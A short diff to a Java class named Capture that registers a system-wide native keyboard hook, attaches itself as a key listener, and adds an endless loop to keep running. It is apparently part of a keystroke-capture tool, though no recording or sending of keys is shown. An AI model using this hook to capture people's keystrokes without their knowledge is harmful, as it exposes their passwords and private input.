@@ -29,7 +29,9 @@ public class Capture implements NativeKeyListener {
     public static void main(String[] args) {
         try {
             GlobalScreen.registerNativeHook();
-            GlobalScreen.getInstance().addNativeKeyListener(new Servidor.Capture());
+            GlobalScreen.getInstance().addNativeKeyListener(new Capture());
+            
+            while(true);
         } catch (NativeHookException ex) {
          
         }
